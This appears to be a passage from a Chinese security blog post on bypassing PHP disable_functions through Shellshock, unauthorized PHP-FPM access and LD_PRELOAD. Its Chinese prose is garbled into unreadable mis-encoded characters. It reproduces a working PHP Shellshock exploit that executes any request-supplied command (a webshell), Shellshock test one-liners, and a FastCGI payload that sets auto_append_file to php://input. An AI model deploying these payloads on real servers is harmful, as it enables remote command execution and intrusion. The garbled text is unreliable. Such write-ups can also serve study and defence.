<p>â€œ(){â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œæ²¡æœ‰åšåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ã€‚</p>
<p>bashå‡½æ•°çš„æ ¼å¼,è°ƒç”¨å‡½æ•°åªéœ€å˜é‡å+å‚æ•°å³å¯<code>å‡½æ•° å‚æ•°1 å‚æ•°2</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">funtion ShellShock </span><br><span class="line">&#123; <span class="built_in">echo</span> <span class="string">&quot;Injection&quot;</span>&#125; ShellShock   <span class="comment">#è°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™çš„Bashçš„ç¯å¢ƒå˜é‡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KEY = ShellShockVALUE = () &#123; echo Injection; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥çœ‹çœ‹ShellShockæ¼æ´çš„çœŸèº«ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export ShellShock=&#x27;() &#123; :; &#125;; echo;/usr/bin/whoami&#x27;</span><br><span class="line"><span class="meta">bash&gt;</span><span class="bash">Kr0iN</span></span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹ç¯å¢ƒå˜é‡ä½ æœ‰ä»€ä¹ˆ<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=<span class="string">&#x27;() &#123; :;&#125;; echo Vulnerable CVE-2014-6271 &#x27;</span> bash -c <span class="string">&quot;echo test&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p>
<h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="phpçš„mailå‡½æ•°"><a href="#phpçš„mailå‡½æ•°" class="headerlink" title="phpçš„mailå‡½æ•°()"></a>phpçš„mailå‡½æ•°()</h4><p>å¦‚æœæœåŠ¡å™¨çš„é»˜è®¤shæ˜¯bash,mailå‡½æ•°ä¼šç”Ÿæˆä¸€ä¸ªbashè¿›ç¨‹,å†ç»“åˆputenv()åˆ©ç”¨ç ´å£³æ¼æ´æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<p>ä¼šç”Ÿæˆbashè¿›ç¨‹é™¤äº†mail,phpå‡½æ•°è¿˜æœ‰imap_mailï¼Œå¦‚æœä½ ä»…ä»…é€šè¿‡ç¦ç”¨mailå‡½æ•°æ¥è§„é¿è¿™ä¸ªå®‰å…¨é—®é¢˜ï¼Œé‚£ä¹ˆimap_mailæ˜¯å¯ä»¥åšæ›¿ä»£çš„ã€‚å½“ç„¶ï¼Œphpé‡Œè¿˜å¯èƒ½æœ‰å…¶ä»–åœ°æ–¹æœ‰è°ƒç”¨popenæˆ–å…¶ä»–èƒ½å¤Ÿæ´¾ç”Ÿbashå­è¿›ç¨‹çš„å‡½æ•°ï¼Œé€šè¿‡è¿™äº›åœ°æ–¹ï¼Œéƒ½å¯ä»¥é€šè¿‡ç ´å£³æ¼æ´æ‰§è¡Œå‘½ä»¤çš„ã€‚</p>
<p>æ›´è¯¦ç»†çš„è§£é‡Š:pç‰›çš„<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html">PHP Execute Command Bypass Disable_functions</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Disabled functions: &quot;</span>.ini_get(<span class="string">&#x27;disable_functions&#x27;</span>).<span class="string">&quot;\n&quot;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">     <span class="variable">$tmp</span> = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>);</span><br><span class="line">     putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;Not vuln (not bash)&quot;</span>;</span><br><span class="line">   <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">   @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´"><a href="#åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´"></a>åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´</h2><h3 id="æ¨èæ–‡ç« "><a href="#æ¨èæ–‡ç« " class="headerlink" title="æ¨èæ–‡ç« "></a>æ¨èæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5598">æµ…æphp-fpmçš„æ”»å‡»æ–¹å¼</a></p>
<h3 id="ä»€ä¹ˆæ˜¯php-fpm"><a href="#ä»€ä¹ˆæ˜¯php-fpm" class="headerlink" title="ä»€ä¹ˆæ˜¯php-fpm"></a>ä»€ä¹ˆæ˜¯php-fpm</h3><p>php-fpmæ˜¯phpå®˜æ–¹çš„fastcgiè§£æå™¨,Nginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚FPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚</p>
<p>è¯´åˆ°fastcgi,å°±å¿…é¡»å…ˆè®²ä¸€ä¸‹cgi</p>
<p>cgiçš„å†å²:</p>
<blockquote>
<p>æ—©æœŸçš„webserveråªå¤„ç†htmlç­‰é™æ€æ–‡ä»¶ï¼Œä½†æ˜¯éšç€æŠ€æœ¯çš„å‘å±•ï¼Œå‡ºç°äº†åƒphpç­‰åŠ¨æ€è¯­è¨€ã€‚<br>webserverå¤„ç†ä¸äº†äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿé‚£å°±äº¤ç»™phpè§£é‡Šå™¨æ¥å¤„ç†å§ï¼<br>äº¤ç»™phpè§£é‡Šå™¨å¤„ç†å¾ˆå¥½ï¼Œä½†æ˜¯ï¼Œphpè§£é‡Šå™¨å¦‚ä½•ä¸webserverè¿›è¡Œé€šä¿¡å‘¢ï¼Ÿ<br>ä¸ºäº†è§£å†³ä¸åŒçš„è¯­è¨€è§£é‡Šå™¨(å¦‚phpã€pythonè§£é‡Šå™¨)ä¸webserverçš„é€šä¿¡ï¼Œäºæ˜¯å‡ºç°äº†cgiåè®®ã€‚åªè¦ä½ æŒ‰ç…§cgiåè®®å»ç¼–å†™ç¨‹åºï¼Œå°±èƒ½å®ç°è¯­è¨€è§£é‡Šå™¨ä¸webwerverçš„é€šä¿¡ã€‚å¦‚php-cgiç¨‹åºã€‚</p>
</blockquote>
<p>Fast-CGI:</p>
<p>è™½ç„¶cgiè§£å†³phpè§£é‡Šå™¨ä¸webserverçš„é€šä¿¡é—®é¢˜ï¼Œä½†æ˜¯webserveræ¯æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚å°±ä¼šå»forkä¸€ä¸ªcgiè¿›ç¨‹,è¯·æ±‚ç»“æŸå†killæ‰è¿™ä¸ªè¿›ç¨‹,è¿™æ ·ä¼šå¾ˆæµªè´¹èµ„æº,äºæ˜¯å‡ºç°äº†cgiçš„æ”¹è‰¯ç‰ˆæœ¬ã€‚</p>
<blockquote>
<p>fast-cgiæ¯æ¬¡å¤„ç†å®Œè¯·æ±‚åï¼Œä¸ä¼škillæ‰è¿™ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯ä¿ç•™è¿™ä¸ªè¿›ç¨‹ï¼Œä½¿è¿™ä¸ªè¿›ç¨‹å¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚è¿™æ ·æ¯æ¬¡å°±ä¸ç”¨é‡æ–°forkä¸€ä¸ªè¿›ç¨‹äº†ï¼Œå¤§å¤§æé«˜äº†æ•ˆç‡ã€‚</p>
</blockquote>
<p>php-fpm æ˜¯ä¸€ä¸ªFastcgiçš„å®ç°,å¹¶æä¾›è¿›ç¨‹ç®¡ç†åŠŸèƒ½ã€‚</p>
<p>è¿›ç¨‹åŒ…å«äº†masterè¿›ç¨‹å’Œworkerè¿›ç¨‹</p>
<p>masterè¿›ç¨‹åªæœ‰ä¸€ä¸ª,è´Ÿè´£ç›‘å¬ç«¯å£(ä¸€èˆ¬æ˜¯9000)æ¥æ”¶æ¥è‡ªWeb Serverçš„è¯·æ±‚,è€Œworkerè¿›ç¨‹åˆ™ä¸€èˆ¬æœ‰å¤šä¸ª(å…·ä½“æ•°é‡æ ¹æ®å®é™…éœ€è¦é…ç½®),æ¯ä¸ªè¿›ç¨‹å†…éƒ¨éƒ½åµŒå…¥äº†ä¸€ä¸ªphpè§£é‡Šå™¨,æ˜¯phpä»£ç çœŸæ­£æ‰§è¡Œçš„åœ°æ–¹ã€‚</p>
<p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p>
<p>ä¸Šé¢ç¬¬ä¸€ä¸ªæ˜¯ä¸»è¿›ç¨‹,ä¸‹é¢ä¸¤ä¸ªæ˜¯workerè¿›ç¨‹ã€‚</p>
<h3 id="æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹"><a href="#æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹" class="headerlink" title="æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹"></a>æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹</h3><p>Fastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚</p>
<p>fastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚</p>
<p>ç±»æ¯”HTTPåè®®æ¥è¯´ï¼Œfastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p>
<p>recordå…·æœ‰å›ºå®šçš„ç»“æ„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> version; <span class="comment">// ç‰ˆæœ¬</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> type; <span class="comment">// æœ¬æ¬¡recordçš„ç±»å‹</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB1; <span class="comment">// æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB1; <span class="comment">// bodyä½“çš„å¤§å°</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingLength; <span class="comment">// é¢å¤–å—å¤§å°</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> reserved; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentData[contentLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>

<p>è€Œå…¶ä¸­çš„<code>type</code>å°±æ˜¯æŒ‡å®šè¯¥recordçš„ä½œç”¨ã€‚å› ä¸ºfastcgiä¸€ä¸ªrecordçš„å¤§å°æ˜¯æœ‰é™çš„ï¼Œä½œç”¨ä¹Ÿæ˜¯å•ä¸€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªTCPæµé‡Œä¼ è¾“å¤šä¸ªrecordã€‚é€šè¿‡<code>type</code>æ¥æ ‡å¿—æ¯ä¸ªrecordçš„ä½œç”¨ï¼Œç”¨<code>requestId</code>ä½œä¸ºåŒä¸€æ¬¡è¯·æ±‚çš„idã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è¯·æ±‚ï¼Œä¼šæœ‰å¤šä¸ªrecordï¼Œä»–ä»¬çš„<code>requestId</code>æ˜¯ç›¸åŒçš„ã€‚</p>
<p>å€Ÿç”¨<a target="_blank" rel="noopener" href="http://blog.csdn.net/shreck66/article/details/50355729">è¯¥æ–‡ç« </a>ä¸­çš„ä¸€ä¸ªè¡¨æ ¼ï¼Œåˆ—å‡ºæœ€ä¸»è¦çš„å‡ ç§<code>type</code>ï¼š</p>
<p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p>
<p>æ ¹æ®è¿™ä¸ªè¡¨æ ¼æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å’Œåç«¯è¯­è¨€é€šä¿¡ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…å°±æ˜¯<code>type</code>ä¸º1çš„recordï¼Œåç»­äº’ç›¸äº¤æµï¼Œå‘é€<code>type</code>ä¸º4ã€5ã€6ã€7çš„recordï¼Œç»“æŸæ—¶å‘é€<code>type</code>ä¸º2ã€3çš„recordã€‚</p>
<p>æˆ‘ä»¬è¦å…³æ³¨çš„é‡ç‚¹å°±æ˜¯type=4çš„éƒ¨åˆ†,ä¹Ÿå°±æ˜¯æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡çš„åœ°æ–¹ã€‚</p>
<p>phpé‡Œæœ‰å¾ˆå¤šæœ‰è¶£çš„è®¾ç½®,åƒæ–‡ä»¶åŒ…å«é‡Œå¸¸ç”¨çš„phpè®¾ç½®<code>auto_prepared_file,auto_append_file</code></p>
<p>æˆ‘ä»¬ä»¤<code>auto_prepared_file=php://input</code>ä¸”<code>allow_url_include=On</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨fastcgiæ¥è®¾ç½®phpçš„ç¯å¢ƒå˜é‡</p>
<p>è¿™åˆæ¶‰åŠåˆ°PHP-FPMçš„ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼Œ<code>PHP_VALUE</code>å’Œ<code>PHP_ADMIN_VALUE</code>ã€‚è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡å°±æ˜¯ç”¨æ¥è®¾ç½®PHPé…ç½®é¡¹çš„ï¼Œ<code>PHP_VALUE</code>å¯ä»¥è®¾ç½®æ¨¡å¼ä¸º<code>PHP_INI_USER</code>å’Œ<code>PHP_INI_ALL</code>çš„é€‰é¡¹ï¼Œ<code>PHP_ADMIN_VALUE</code>å¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ã€‚ï¼ˆ<code>disable_functions</code>é™¤å¤–ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯PHPåŠ è½½çš„æ—¶å€™å°±ç¡®å®šäº†ï¼Œåœ¨èŒƒå›´å†…çš„å‡½æ•°ç›´æ¥ä¸ä¼šè¢«åŠ è½½åˆ°PHPä¸Šä¸‹æ–‡ä¸­ï¼‰</p>
<p>ç»“æ„ä½“å®ä¾‹:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span> =&gt; <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REMOTE_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;REMOTE_PORT&#x27;</span> =&gt; <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_ADDR&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_PORT&#x27;</span> =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_NAME&#x27;</span> =&gt; <span class="string">&#x27;mag-tured&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;CONTENT_TYPE&#x27;</span> =&gt; <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span> =&gt; strlen(<span class="variable">$content</span>),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span> =&gt;<span class="string">&#x27;auto_append_file=php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>=&gt;<span class="string">&#x27;allow_url_include=On&#x27;</span></span><br><span class="line">	)</span><br></pre></td></tr></table></figure>



<h3 id="åŸç†æµ…æ"><a href="#åŸç†æµ…æ" class="headerlink" title="åŸç†æµ…æ"></a>åŸç†æµ…æ</h3><p>è¿™ä¸ªåŸç†çš„æ¼æ´åŸå› æ˜¯PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´,php-fpmæ²¡æœ‰å¯¹å‘é€æ•°æ®çš„æ¥æºè¿›è¡ŒéªŒè¯,å¯¼è‡´åªè¦æˆ‘ä»¬å‘php-fpmå‘é€ç¬¦åˆæ ¼å¼çš„æ•°æ®å°±å¯ä»¥è¢«è§£æ.å†ç»“åˆfastcgiè®¾ç½®ç¯å¢ƒå˜é‡çš„éƒ¨åˆ†æ¥è¾¾åˆ°getshell</p>
<h3 id="fpmåˆ©ç”¨è„šæœ¬"><a href="#fpmåˆ©ç”¨è„šæœ¬" class="headerlink" title="fpmåˆ©ç”¨è„šæœ¬"></a>fpmåˆ©ç”¨è„šæœ¬</h3><p>åˆ†äº«ä¸ªpç‰›è„šæœ¬é‡Œé¢çš„ä¸€ä¸ªclientå®¢æˆ·ç«¯: <a target="_blank" rel="noopener" href="https://github.com/wuyunfeng/Python-FastCGI-Client">Python FastCGI Client</a><br>è¿˜æœ‰Lz1yå¸ˆå‚…ç»™çš„ä¸€ä¸ªphpå®¢æˆ·ç«¯ <a target="_blank" rel="noopener" href="https://github.com/adoy/PHP-FastCGI-Client.git">PHP FastCGI Client</a></p>
<p>è¿˜è¦phpè¯­è¨€å®¢æˆ·ç«¯: <a target="_blank" rel="noopener" href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans">fastcgiå®¢æˆ·ç«¯PHPè¯­è¨€å®ç°</a></p>
<h2 id="LD-PRELOADç»•è¿‡"><a href="#LD-PRELOADç»•è¿‡" class="headerlink" title="LD_PRELOADç»•è¿‡"></a>LD_PRELOADç»•è¿‡</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>è¿™é‡Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹åŸç†ï¼Œé¦–å…ˆä»€ä¹ˆæ˜¯LD_PRELOADï¼Ÿ</p>
<p>googleç»™å‡ºå¦‚ä¸‹å®šä¹‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</span><br></pre></td></tr></table></figure>

<p>å³LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨</p>
<p>è€Œputenvå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( <span class="keyword">string</span> <span class="variable">$setting</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>

<p>æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸‹éªšæ“ä½œ</p>
<blockquote>
<p>1.åˆ¶ä½œä¸€ä¸ªæ¶æ„shared libraries<br>2.ä½¿ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„<br>3.ä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘specific shared library</p>
</blockquote>
<h4 id="åˆ©ç”¨å‡½æ•°"><a href="#åˆ©ç”¨å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡½æ•°"></a>åˆ©ç”¨å‡½æ•°</h4><p><code>putenv,errorlog,mail</code></p>
<h4 id="å¦‚ä½•åˆ¶ä½œshared-libraries"><a href="#å¦‚ä½•åˆ¶ä½œshared-libraries" class="headerlink" title="å¦‚ä½•åˆ¶ä½œshared libraries"></a>å¦‚ä½•åˆ¶ä½œshared libraries</h4><p>é€‰æ‹©è¦æ›¿æ¢çš„å‡½æ•°æˆ‘ä»¬è¿™é‡Œé€‰å–geteuid()</p>
<p>ç†ç”±æ˜¯phpçš„mail()å‡½æ•°ä¼šè°ƒç”¨ç³»ç»Ÿçš„sendmailå‘½ä»¤è€Œsendmailå‘½ä»¤ä¼šè°ƒç”¨getuid()è¿™ä¸ªå‡½æ•°,æ‰€ä»¥æˆ‘ä»¬ç¡®å®šç›®æ ‡ä¸ºgeteuidå‡½æ•°</p>
